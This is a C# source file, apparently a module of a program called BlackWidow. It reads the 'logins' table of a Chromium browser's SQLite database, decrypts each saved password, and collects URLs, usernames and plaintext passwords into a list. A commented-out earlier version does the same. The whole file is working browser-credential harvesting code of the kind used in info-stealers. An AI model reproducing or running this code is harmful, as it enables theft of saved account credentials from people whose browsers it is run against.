using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using BlackWidow.Module;

namespace BlackWidow.Browser
{
    class ChromiumBase
    {
        //public static List<BrRecover> GetPasswords(string path)
        //{
        //    string application = GetApplication.BrowserName(path);
        //    List<BrRecover> result;
        //    try
        //    {
        //        SqlHandler sqlite = new SqlHandler(path);
        //        var list = new List<BrRecover>();
        //        sqlite.ReadTable("logins");
        //        for (int i = 0; i < sqlite.GetRowCount(); i++)
        //        {
        //            try
        //            {
        //                string text2 = string.Empty;
        //                try
        //                {
        //                    byte[] bytes = Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 5)), null);
        //                    text2 = Encoding.UTF8.GetString(bytes);
        //                }
        //                catch (Exception)
        //                {
        //                }
        //                if (text2 != "")
        //                {
        //                    list.Add(new BrRecover
        //                    {
        //                        URL = sqlite.GetValue(i, 1),
        //                        Username = sqlite.GetValue(i, 3),
        //                        Password = text2,
        //                        Application = application
        //                    });
        //                }
        //            }
        //            catch (Exception ex)
        //            {
        //                Console.WriteLine(ex.ToString());
        //            }
        //        }
        //        result = list;
        //    }
        //    catch (Exception)
        //    {
        //        throw;
        //    }
        //    return result;
        //}
        public static List<BrRecover> GetPasswords(string datapath)
        {
            string application = GetApplication.BrowserName(datapath);
            List<BrRecover> list = new List<BrRecover>();
            SQLiteHandler sqliteHandler = null;
            if (!File.Exists(datapath))
            {
                return list;
            }
            try
            {
                sqliteHandler = new SQLiteHandler(datapath);
            }
            catch (Exception)
            {
                return list;
            }
            if (!sqliteHandler.ReadTable("logins"))
            {
                return list;
            }
            int rowCount = sqliteHandler.GetRowCount();
            for (int i = 0; i < rowCount; i++)
            {
                try
                {
                    string value = sqliteHandler.GetValue(i, "origin_url");
                    string value2 = sqliteHandler.GetValue(i, "username_value");
                    string text = ChromeDecrypt.Decrypt(sqliteHandler.GetValue(i, "password_value"));
                    if (!string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && text != null)
                    {
                        list.Add(new BrRecover
                        {
                            URL = value,
                            Username = value2,
                            Password = text,
                            Application = application
                        });
                    }
                }
                catch (Exception)
                {
                }
            }
            return list;
        }
    }
}
